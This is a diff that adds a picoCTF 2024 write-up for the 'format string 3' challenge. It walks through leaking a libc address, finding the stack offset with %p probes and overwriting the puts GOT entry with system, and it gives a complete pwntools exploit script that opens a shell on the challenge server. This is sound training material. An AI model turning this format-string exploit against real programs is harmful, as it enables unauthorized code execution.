@@ -695,6 +695,67 @@ Solution:
 2. When running the program, it first asks what to server for Patrick. After choosing, it has a check `count > 2 * BUFSIZE` where count is `printf(<selected value>)` and `BUFSIZE` is `32`. Out of the options `Gr%114d_Cheese` is longer than 32 because it has `%114d` which normally asks numbers size of 114 but because not provided, it is filled with random characters.
 3. After Patrick is served with `Gr%114d_Cheese`, Bob needs to be served next. He has an option `Cla%sic_Che%s%steak` which in `printf` expects strings to fill `%s` and when not provided, tries to access invalid memory location triggering `sigsegv_handler` function.
 
+#### format string 3
+- [Link](https://play.picoctf.org/practice/challenge/449)
+- From: PicoCTF 2024
+- Difficulty: Medium
+- Completed: 2024/10/13
+
+Description:
+
+This program doesn't contain a win function. How can you win?
+
+Download the binary [here](https://artifacts.picoctf.net/c_rhea/29/format-string-3).
+
+Download the source [here](https://artifacts.picoctf.net/c_rhea/29/format-string-3.c).
+
+Download libc [here](https://artifacts.picoctf.net/c_rhea/29/libc.so.6), download the interpreter [here](https://artifacts.picoctf.net/c_rhea/29/ld-linux-x86-64.so.2). Run the binary with these two files present in the same directory.
+
+Solution:
+
+I had to look help by reading [this writeup](https://blog.thecyberthesis.com/blog/writeups/picoCTF/pwn/format-string-3) and it was referencing to [this great blog post](https://www.theflash2k.me/blog/ctf-techs/fsb-guide).
+
+The goal of this challenge is to overwrite `puts` entry in Global Offset Table (GOT) to so instead of calling `puts("/bin/sh")` we call `system("/bin/sh")` which gives terminal access to the server.
+
+1. The program prints `setvbuf` address in memory
+    1. `0x71ac0c2553f0`
+2. Find offset of input in stack
+    1. For a payload, we need index in stack where the input is added. When `%p` is given to `printf`, it outputs hex value. If there are more s.. than parameters, the function starts taking values from stack. By adding something familiar like AAAAAAAA, we can recgonize where it's located in the stack.
+    2. Inputting `AAAAAAAA|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|` to the program, shows that `0x4141...` (=AA...) is located in `38`.
+3. Find offset of `setvbuf` in `libc` library
+    1. To calculate where in `libc` library `setvbuf` is located we can call `objdump -T ./libc.so.6 | grep "setvbuf"`
+    2. `0x000000000007a3f0`
+4. Calculate offset of `libc` in memory
+    1. We know address of `setvbuf` and offset in `libc` library so we can calulate address of `libc` by reducing offset from the address.
+    2. `0x71ac0c2553f0 - 0x000000000007a3f0 = 0x71AC0C1DB000`
+5. Python payload
+`pwn` library in Python has a function called `fmtstr_payload` which can replace `puts` with `system`. Basically otherwise the code does above steps.
+
+```python
+from pwn import *
+
+exe = "./format-string-3"
+elf = context.binary = ELF(exe)
+libc = ELF("./libc.so.6")
+
+io = remote("rhea.picoctf.net", 51240)
+
+start = 38
+
+io.recvuntil(b'setvbuf in libc: ')
+leak = int(io.recvline().strip(), 16)
+print("setvbuf @ %#x" % leak)
+
+libc.address = leak - 0x000000000007a3f0
+print("libc @ %#x" % libc.address)
+
+payload = fmtstr_payload(start, {elf.sym.got.puts: libc.sym.system})
+
+io.sendline(payload)
+io.interactive()
+```
+
+6. Running this payload against the server given in the description gives terminal access. `ls` reveals a file called `flag.txt` and the flag is hidden inside is as text content.
 
 
 ---
